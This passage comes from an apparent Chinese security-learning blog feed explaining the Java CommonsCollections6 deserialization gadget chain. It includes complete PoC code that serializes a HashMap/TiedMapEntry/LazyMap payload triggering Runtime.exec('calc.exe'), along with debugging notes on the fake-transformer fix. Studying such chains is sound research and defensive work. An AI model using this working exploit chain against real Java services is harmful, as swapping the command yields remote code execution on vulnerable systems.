title="cc6"></a>cc6</h2><p>而在cc6中，我们同样可以像cc1一样，首先添加一个假的<code>Transformer</code>数组，然后最后再将真正有危害的添加进去，这样可以避免许多问题，事实上<code>ysoserial</code>确实也是这么做的，而且后面也有隐藏异常日志的<code>ConstantTransformer(1)</code>操作，只不过由于我们的链子和<code>ysoserial</code>上给的不完全一样，所以说这次就不按照<code>ysoserial</code>上的分析了；但当我们加上假的<code>Transformer</code>数组，后面再变成真的之后，会发现一个问题，那就是命令并没有执行，看下面这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来没有任何问题，那我们点运行：</p><p><img src="https://s2.loli.net/2022/02/14/hnlJoDFaf6svqBT.png" alt="image.png"></p><p>什么也没有发生，并没有弹出计算器，这是为什么呢，来单步调试看看，看它有没有正常执行<code>transform</code>：</p><p><img src="https://s2.loli.net/2022/02/14/TxNoOWeqSXBrgHb.png" alt="image.png"></p><p>这里就出现问题了，这里<code>map.containsKey(key)</code>得为假才能进入<code>if</code>语句，但是这里已经告诉了我们，<code>super.map.containsKey(key)</code>为true，那就意味着它这儿没有正常进入<code>transform</code>中，那当然就执行不了命令了</p><p>其实在单步调试的过程中，我们可以看到，这里的问题出在<code>expMap.put(tme, &quot;valuevalue&quot;);</code>，而这个<code>put</code>方法中，又正好拥有<code>hash(key)</code>方法，那么我们回忆一下cc6的链子，这链子是不是就已经连上了，相当于本地触发了；而我们第一次传入的是<code>faketransformers</code>，这个时候<code>super.map.containsKey(key)</code>是为false的，是正常的，问题就是它进入了之后，执行了<code>super.map.put()</code>操作，这就出问题了呀，把我们key为<code>keykey</code>的对象放进去了，导致第二次，我们真正的<code>transformers</code>传进来之后，利用反序列化触发时，它就为true了，也就没办法触发了</p><p>用p神的话说，这⾥就导致<code>LazyMap</code>这个利⽤链在前面就已经被调⽤了⼀遍，因为我前⾯⽤了<code>fakeTransformers</code> ，所以此时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响</p><p>这里的解决方法也就很简单，只需要将这个<code>Key</code>，再从<code>outerMap</code>中移除即可： <code>outerMap.remove(&quot;keykey&quot;)</code></p><p><img src="https://s2.loli.net/2022/02/14/NS3i1ufwmVRjJY2.png" alt="image.png"></p><p>完美操作，成功，弹出计算器哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ysoserial中的一些操作&quot;&gt;&lt;a href=&quot;#ysoserial中的一些操作&quot; class=&quot;headerlink&quot; title=&quot;ysoserial中的一些操作&quot;&gt;&lt;/a&gt;ysoserial中的一些操作&lt;/h1&gt;&lt;p&gt;前面我们分析了cc1和cc6，但当我们去看&lt;code&gt;ysoserial&lt;/code&gt;中时，会发现它里面有一些其它的操作，这篇文章我们就来看看这些操作的目的以及它所起到的作用&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 6</title>
    <link href="https://arsenetang.github.io/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/"/>
    <id>https://arsenetang.github.io/2022/02/14/Java%E7%AF%87%E4%B9%8BCommonsCollections%206/</id>
    <published>2022-02-13T16:00:00.000Z</published>
    <updated>2022-03-07T13:59:02.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h1><p>前面的三篇文章我们介绍完了cc1的链子，但朋友们不难发现，无论是<code>TransformedMap</code>，还是<code>LazyMap</code>，在Java高版本(8u71之后)，都不能再利用了，主要问题是出在<code>AnnotationInvocationHandler</code>类中的，所以说我们这篇文章来介绍一条相对通用的链子，而这条链子就是<code>CommonsCollections6</code></p><span id="more"></span><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>我们都知道，想要触发利用链，需要找到地方去触发<code>LazyMap</code>中的<code>get</code>方法，然后后面的内容我们上一篇文章就已经说过了，所以说解决Java高版本利用问题的核心，实际上就是寻找上下文中是否还有其它调用<code>LazyMap#get()</code></p><p>这时候我们找到的类就是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，我们来看看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.keyvalue;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.KeyValue;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^(value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在<code>getValue()</code>中调用了<code>this.map.get()</code>，然后在<code>hashCode()</code>中又调用了<code>getValue()</code>，所以说我们现在的核心就是找到哪里调用了<code>TiedMapEntry</code>中的<code>hashCode()</code></p><p>在<code>ysoserial</code>中，它是利⽤ <code>java.util.HashSet#readObject</code> 到 <code>HashMap#put()</code> 到 <code>HashMap#hash(key) </code>最后到 <code>TiedMapEntry#hashCode()</code>的</p><p>但是p神发现太麻烦了，于是找到了在<code>java.util.HashMap#readObject</code>中就可以直接调用<code>HashMap#hash()</code>，然后再调用<code>TiedMapEntry#hashCode()</code>就行了</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>于是说我们来看看<code>HashMap</code>的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在这里我们可以看到<code>hash(key)</code>，调用了<code>hash</code>方法，再去看<code>hash</code>方法里面调用了<code>key.hashCode()</code>，成功调用了<code>hashCode</code>方法，那么只要将这个<code>key</code>赋值为我们设置好的<code>TiedMapEntry</code>对象就好了，这样就成功调用<code>TiedMapEntry#hashCode()</code>，进而触发漏洞</p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><p>我们先来看看这条链子的思路，来自p神：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment"> java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment"> java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment"> org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment"> java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>首先我们发现<code>HashMap</code>中的<code>readObject()</code>方法中可以调<code>hash</code>方法，而在<code>hash()</code>方法中会调用<code>key.hashCode()</code>，那我们就把需要执行<code>hashCode</code>方法的对象放在<code>key</code>位置上就好了，然后在<code>TiedMapEntry</code>中的<code>hashCode</code>方法里面会调用<code>getValue</code>方法，然后就可以触发<code>LazyMap</code>中的<code>get</code>方法，就和前面的cc1一样了，其实思路挺简单的，甚至我感觉比cc1更好理解，接下来就看poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/14/4Dtg5VCaS2njGbv.png" alt="image.png"></p><p>大家如果有读过<code>ysoserial</code>的源码会发现和我写的可能有一些不一样，因为<code>ysoserial</code>中考虑的情况可能会更多一些，在实战中能应对更多复杂的情况，但相对的，里面就会有一些不是核心的代码，这里我就把它略过了，让大家只看核心过程，更加方便理解，当然，这不是最终POC哈，只是学习这个思路，最终的POC还得看下一篇文章，下一篇文章中再来和大家介绍<code>ysoserial</code>中进行的操作，以及进行这些操作的目的，进行完这些操作之后，生成最终的POC</p><p>哈哈哈哈话说今天还是情人节 祝天下的情人们节日快乐哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-6&quot;&gt;&lt;a href=&quot;#Commons-Collections-6&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 6&quot;&gt;&lt;/a&gt;Commons Collections 6&lt;/h1&gt;&lt;p&gt;前面的三篇文章我们介绍完了cc1的链子，但朋友们不难发现，无论是&lt;code&gt;TransformedMap&lt;/code&gt;，还是&lt;code&gt;LazyMap&lt;/code&gt;，在Java高版本(8u71之后)，都不能再利用了，主要问题是出在&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;类中的，所以说我们这篇文章来介绍一条相对通用的链子，而这条链子就是&lt;code&gt;CommonsCollections6&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
